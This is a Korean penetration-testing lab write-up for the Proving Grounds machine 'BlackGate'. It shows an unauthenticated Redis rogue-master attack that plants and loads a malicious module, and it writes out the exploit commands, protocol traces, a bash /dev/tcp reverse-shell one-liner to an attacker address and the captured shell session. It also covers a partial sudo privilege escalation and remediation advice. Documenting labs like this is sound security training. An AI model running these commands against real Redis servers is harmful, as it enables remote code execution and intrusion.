---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/partial
  - tech/svc/redis
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.141.176
ports: [22, 6379]
services: [redis, ssh]
status: partial
manual_tags: true
manual_status: true
tech_count: 3
---

> [!info] 요약
> **BlackGate** · Proving Grounds Advanced · Ubuntu Linux (`blackgate`, 192.168.141.176) · 플래그 2개 중 **1개 확보** — `proof.txt` 미확보, 근거는 `Post-Exploitation`
> 진입점: 무인증 Redis 4.0.14 → `SLAVEOF` rogue master → `exp.so` 적재 → `system.exec` → `prudence` 리버스셸 → `local.txt`
> 권한상승: **미완** — `sudo -l` 의 `(root) NOPASSWD: /usr/local/bin/redis-status` 식별까지
> `local.txt` = `c68b27d911143e2a9d167fc47cc3a56d`(prudence) · `proof.txt` **미확보** — 근거는 `Post-Exploitation`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.141.176

### Initial Access – 무인증 Redis 의 복제 기능으로 임의 모듈을 심고 그 모듈로 원격 명령 실행

**Vulnerability Explanation:**
- 6379/tcp Redis 4.0.14 무인증 노출. `AUTH` 없이 `SLAVEOF`·`CONFIG SET`·`MODULE LOAD` 전부 수락
- 복제는 설계상 「마스터가 보낸 RDB 바이트를 슬레이브가 자신의 `dir`/`dbfilename` 경로에 그대로 기록」하는 동작. 마스터를 공격자가 세우면 그 바이트도 공격자 소관이므로 **임의 파일 쓰기**로 전락
- Redis 4.0 부터의 모듈 API 는 `MODULE LOAD <path>` 로 그 파일을 `dlopen` 하고 `RedisModule_OnLoad` 를 호출. 위 두 동작이 겹쳐 「임의 파일 쓰기 → 그 파일을 네이티브 코드로 실행」이 한 연쇄로 성립
- 얻는 권한은 모듈이 아니라 **redis-server 구동 계정**에서 옴. 이 대상은 `uid=1001(prudence)` 라 즉시 root 가 아니라 일반 사용자 셸

**Vulnerability Fix:**
- `requirepass`(또는 Redis 6+ ACL) 설정과 6379 의 루프백·내부망 한정. 무인증 노출이 이 경로 전체의 전제
- `rename-command` 로 `MODULE` 을 비우면 적재 단계가 끊겨 연쇄 불성립. `SLAVEOF` 를 비우면 rogue master 경로 차단 — 5.0 이상은 `REPLICAOF` 별칭도 함께 비울 것
- `CONFIG` 만 비우는 것은 부족 — `dbfilename` 변경이 막힐 뿐 복제가 기본 경로에 파일을 쓰는 동작은 잔존하고, `MODULE LOAD` 의 인자는 이름이 아니라 경로

**Severity:** Critical — 인증·자격증명 없이 원격 코드 실행. 이 대상에서 `prudence` 대화형 셸과 `local.txt` 까지 도달

**Steps to reproduce the attack:**
1. `RedisModulesSDK/exp` 에서 `exp.so` 컴파일
2. `redis-master.py` 로 rogue master 를 세우고 타겟에 `SLAVEOF` 지시
3. `dbfilename` 을 `exp.so` 로 바꿔 모듈을 타겟 디스크에 기록
4. `MODULE LOAD ./exp.so` 후 `system.exec` 으로 명령 실행 확인
5. `system.exec` 으로 `bash -c` 리버스셸 실행, Kali 리스너에서 수신
6. `~/local.txt` 를 셸에서 원위치 `cat`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.141.176 | TCP: 22, 6379 |

```bash
┌──(kali㉿kali)-[~/PG/BlackGate]
└─$ nnmap 192.168.141.176
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-28 13:44 +0900
Nmap scan report for 192.168.141.176
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   86.23 ms 192.168.45.1
2   86.18 ms 192.168.45.254
3   86.28 ms 192.168.251.1
4   86.36 ms 192.168.141.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```
— 출처: 대화형 터미널 캡처. 같은 스캔의 파일 기록은 `~/PG/BlackGate/nmap.log` — `-oN` 형식이라 헤더·푸터 줄만 `#` 주석 형태로 다름

`nnmap` 은 `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log` 의 별칭. 65535 포트 전수 스캔이 26.44초(로그 헤더 13:44:23 → 푸터 13:44:50)로 끝나 좁힌 스캔을 따로 돌릴 이유 부재.

버전·역할 판정 근거:
- 열린 포트가 22·6379 둘뿐. 웹 서비스 부재라 디렉터리 열거·소스 열람 계열은 **해당 없음**. 벡터는 6379 단독으로 축소
- 배너 `Redis key-value store 4.0.14`. 4.0 은 모듈 API 도입 판이라 `MODULE LOAD` 경로가 성립하는 최소 버전. 뒤의 `MODULE LOAD` 성공이 배너와 독립된 둘째 근거
- nmap OS 추정은 `Linux 5.0 - 5.14` 와 `MikroTik RouterOS 7.2 - 7.5` 로 갈림. SSH 배너 `OpenSSH 8.3p1 Ubuntu 1ubuntu0.1` 과 셸 확보 후 프롬프트 `prudence@blackgate` 가 Ubuntu 쪽을 확정. **OS 추정이 갈릴 때 판정을 가른 것은 배너**

정찰 단계의 증적은 nmap 로그 원문. GUI 서비스가 없어 화면 증적 **해당 없음**.

무인증 여부와 `CONFIG`·`MODULE` 의 `rename-command` 여부를 `redis-cli INFO`·`MODULE LIST`·`CONFIG GET dir` 로 사전 판정하지 않고 익스플로잇을 직접 투입. 성립 여부는 `SLAVEOF` 에 대한 `+OK` 응답으로 확인.

### Initial Access – Redis rogue master 로 `exp.so` 적재 후 리버스셸

이 경로의 일반 절차·판정 명령·시행착오는 [[_PLAYBOOK]] `B-25` 참조. 이 절은 이 박스의 실제 재현.

`searchsploit redis 4.0` 이 내놓은 후보 EDB **44904** 는 `Redis-cli < 5.0 - Buffer Overflow (PoC)` — **클라이언트 측** 버퍼 오버플로 PoC 라 서버 RCE 와 무관. 이 때문에 exploit-db 가 아니라 rogue slave 계열 공개 익스플로잇으로 전환.

- **저장소 교체** — 먼저 붙은 `Ridter/redis-rce`(08-28 clone)로는 셸 미확보. 3일 뒤 `vulhub/redis-rogue-getshell`(08-31 clone)로 교체 후 성공
- **명령 출처** — 이후 이 절의 모든 명령은 `redis-rogue-getshell` 의 `redis-master.py`
- **현장 빌드** — 저장소가 모듈 소스(`RedisModulesSDK/exp/exp.c`)와 `Makefile` 을 함께 담고 있어 `.so` 를 현장에서 빌드

**원본 소스는 현행 gcc 에서 그대로 컴파일 불가.** 인클루드 두 줄 추가:

```diff
diff --git a/RedisModulesSDK/exp/exp.c b/RedisModulesSDK/exp/exp.c
index cfeb95e..52e437c 100644
--- a/RedisModulesSDK/exp/exp.c
+++ b/RedisModulesSDK/exp/exp.c
@@ -8,6 +8,8 @@
 #include <sys/types.h> 
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
 
 int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 	if (argc == 2) {
```
— 출처: `~/PG/BlackGate/redis-rogue-getshell/` 의 upstream `f89fc78` 대비 차분. 원본은 같은 디렉터리의 `exp.c.orig`

추가 전 소스로 되돌려 빌드하면 세 함수가 전부 오류:

```text
exp.c:23:29: error: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
exp.c:27:25: error: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
exp.c:48:38: error: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
```
— gcc (Debian 15.3.0-1) 15.3.0 에서 `exp.c.orig` 사본을 빌드한 결과 중 **`error` 줄만 발췌**(경고 다수 동반). 암묵적 선언이 오류로 승격된 현행 gcc 의 동작이라 저장소 나이가 그대로 빌드 실패로 나타남

빌드된 `exp.so` 로 명령 실행 성립을 먼저 확인. `-c "id"` 한 발이 「모듈이 적재됐는가」와 「어느 계정으로 도는가」를 동시에 답함:

```bash
┌──(kali㉿kali)-[~/PG/BlackGate/redis-rogue-getshell]
└─$ python redis-master.py -r 192.168.141.176 -p 6379 -L 192.168.45.223 -P 4444 -f RedisModulesSDK/exp.so -c "id"
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.223\r\n$4\r\n4444\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC 9e425474497a66eb92853781cf9f9d5aa8978d9e 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$60\r\nuid=1001(prudence) gid=1001(prudence) groups=1001(prudence)\n\r\n'
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)

>> send data: b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
>> receive data: b'+OK\r\n'
```

![[파일보관/d328a8b036f408dd082ce86ea9a0df35_MD5.jpg]]
*그림 1 — 명령 투입부터 `MODULE UNLOAD` 응답까지 위 블록 전체가 담긴 한 화면. `uid=1001(prudence)` 라 이 경로가 root 가 아니라 일반 사용자 셸에서 끝난다는 판정의 근거*

`-P` 는 **rogue master 가 Kali 에서 열 리슨 포트**(스크립트 기본값 21000)이지 콜백 포트가 아님. 리버스셸 수신용 `nc` 리스너와 **같은 번호를 주면 두 프로세스가 Kali 의 같은 포트를 바인드**하게 되므로 반드시 갈라 쓸 것 — 아래 명령이 `-P 8888` 과 콜백 `4444` 로 나뉜 이유.

`system.exec` 은 모듈 안에서 `popen(cmd, "r")` 로 실행되고 `popen` 은 `/bin/sh -c` 를 거침. Ubuntu 의 `/bin/sh` 는 dash 이고 `>&` 는 bash 전용 문법이라, 리버스셸 원라이너를 그대로 넘기면 파싱 단계에서 실패. **`bash -c '...'` 로 감싸 실행 셸 명시 필요**:

```bash
┌──(kali㉿kali)-[~/PG/BlackGate/redis-rogue-getshell]
└─$ python redis-master.py -r 192.168.141.176 -p 6379 -L 192.168.45.223 -P 8888 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.45.223/4444 0>&1'"
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.223\r\n$4\r\n8888\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC c25151b12aedce1e116d683d1626109a013bea2b 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b"*2\r\n$11\r\nsystem.exec\r\n$54\r\nbash -c 'bash -i >& /dev/tcp/192.168.45.223/4444 0>&1'\r\n"
```

마지막 `send data` 뒤에 `receive data` 가 없는 것은 실패가 아님. `popen(cmd, "r")` 이 자식의 출력을 끝까지 읽으려 대기하는데 그 자식이 리버스셸이라 종료하지 않으므로 응답이 돌아오지 않음 — **스크립트가 멈춘 것이 아니라 셸이 붙은 상태**.

리스너에서 수신하고 `local.txt` 를 원위치에서 읽음:

```bash
┌──(kali㉿kali)-[~/PG/BlackGate]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.141.176] 53428
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
prudence@blackgate:/tmp$ whoami
whoami
prudence
prudence@blackgate:/tmp$ ls
ls
exp.so
netplan_wryhz7j_
netplan_xlqiteug
snap.lxd
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-logind.service-QMmiQg
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-resolved.service-wOhzMg
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-timesyncd.service-DasY2f
vmware-root_708-2998936538
prudence@blackgate:/tmp$ cd
cd
prudence@blackgate:~$ ls
ls
local.txt
notes.txt
prudence@blackgate:~$ cat local.txt
cat local.txt
c68b27d911143e2a9d167fc47cc3a56d
```

셸의 초기 cwd 가 `/tmp` 이고 그 안에 `exp.so` 가 보이는 것이 redis-server 의 `dir` 이 `/tmp` 였다는 증거. 즉 모듈이 실제로 기록된 경로가 `/tmp/exp.so`.

`prudence` 홈에 `notes.txt` 도 존재. 내용 **관측 없음**.

**Local.txt value:**

```text
c68b27d911143e2a9d167fc47cc3a56d
```

채점 3요건 중 **둘 충족**.

- **플래그 내용과 권한** — `whoami` → `prudence` 와 프롬프트 `prudence@blackgate:~$` 가 플래그 값과 같은 세션 전사에 공존
- **타깃 IP** — `ip a` 를 같은 화면에 미포함. 보완 근거는 리스너의 `connect to [192.168.45.223] from (UNKNOWN) [192.168.141.176] 53428` 한 줄
- **재촬영** — 대상 인스턴스 정지로 **불가**

### Privilege Escalation – sudo NOPASSWD `/usr/local/bin/redis-status` (미완)

**Vulnerability Explanation:**
- 확정된 부분 — `prudence` 가 비밀번호 없이 root 권한으로 `/usr/local/bin/redis-status` 실행 가능. sudoers 항목이 그 한 바이너리로 한정
- 미확정된 부분 — 해당 파일의 종류·내용·호출 대상 **관측 없음**

**Vulnerability Fix:**
- sudoers 의 해당 NOPASSWD 항목 회수. 운영상 상태 조회가 필요하면 래퍼 스크립트 대신 `systemctl status` 계열의 polkit 규칙 허용이 대안 — 노출 표면 축소
- 래퍼를 존치할 경우 내부 호출을 절대 경로로 고정할 것
- 사용자 인자를 셸 해석 경로로 넘기지 말 것 — sudoers 의 `secure_path` 는 PATH 만 덮어쓰므로 인자는 그 통제 밖

**Severity:** 미판정 — 악용 미완

**Steps to reproduce the attack:**
1. `prudence` 셸에서 `sudo -l`
2. 이후 단계 **미완**

```bash
prudence@blackgate:~$ sudo -l
sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

`sudo -l` 이후의 열거 출력 **관측 없음** — SUID·capabilities·크론·프로세스 목록 및 `redis-status` 자체의 `file`·`cat`·`strings` 결과가 산출물에 부재. 대상 인스턴스 정지로 추가 수집 **불가**.

`/tmp` 목록의 `snap.lxd` 는 snapd 가 만드는 디렉터리. 다만 셸 프로세스의 `id` 는 `groups=1001(prudence)` 단독이라 `lxd` 보조그룹 부재. `/etc/group` 원문은 **관측 없음**.

### Post-Exploitation

root 권한 미확보. `/root/proof.txt` 에 도달하지 못했으므로 취득 경로 **해당 없음**.

**Proof.txt value:**
`없음`

- 획득 권한 — `uid=1001(prudence)`. root 미확보
- 근거 — 플래그 전수 탐색 출력·`proof_root.txt` 형식의 증거 화면이 산출물에 부재하고, 세션 기록도 `sudo -l` 에서 단절. 플래그 값 부재
- 판정 — 플래그 2개 중 **1개 확보(1/2)**

**남긴 흔적**

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | `/tmp/exp.so` | 모듈 `exp.so` — `system.exec`·`system.rev` 등록 | 잔존 |
| 설정 변경 | Redis `dbfilename` | `dump.rdb` → `exp.so` → `dump.rdb` | 되돌림 |
| 설정 변경 | Redis 복제 | `SLAVEOF 192.168.45.223 <포트>` → `SLAVEOF NO ONE` | 되돌림 |
| 로드된 모듈 | Redis `system` | `MODULE LOAD ./exp.so` | 첫 실행은 `MODULE UNLOAD`. 리버스셸 실행분은 언로드 미도달 |

- 인스턴스는 Stop 시 파괴되므로 랩에서는 소멸. 실 평가라면 `/tmp/exp.so` 삭제와 모듈 언로드가 필요한 항목
- 이 세션의 LHOST — 192.168.45.223 (VPN 재접속마다 변동)

## 관련

- vulhub/redis-rogue-getshell — https://github.com/vulhub/redis-rogue-getshell
- Ridter/redis-rce — https://github.com/Ridter/redis-rce
- 산출물 — `~/PG/BlackGate/nmap.log` · `~/PG/BlackGate/redis-rogue-getshell/`(`exp.c` 수정본과 `exp.c.orig`, 빌드된 `exp.so`) · `~/PG/BlackGate/redis-rce/`
- 증적 이미지 — `Pasted image 20260831104607.png`
- 원문 미보존 항목 — EDB 44904 시도 로그(파일 삭제됨) · 리버스셸 미착 시도들의 오류 출력 · `sudo -l` 이후 열거 출력
- [[Wombo]] — 같은 Redis rogue master 경로. 그쪽은 redis-server 가 uid 0 으로 구동돼 foothold 가 곧 root 였고, 이 박스는 `uid=1001` 이라 **같은 익스플로잇이 다른 지점에서 끝남**
- [[Zipper]] · [[Crane]] — 명령이 `/bin/sh`(dash)를 거쳐 `>&` 가 깨지는 같은 함정. 우회 수단은 갈림 — Zipper 는 이 박스와 같은 `bash -c '...'` 래핑, Crane 은 base64 로 한 겹 감싼 뒤 `| bash`
- **"명령 실행은 되는데 리버스셸만 안 붙는다"** 패턴 — 이 노트(`popen` → `/bin/sh` → dash), [[_PLAYBOOK]] `A-31`
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
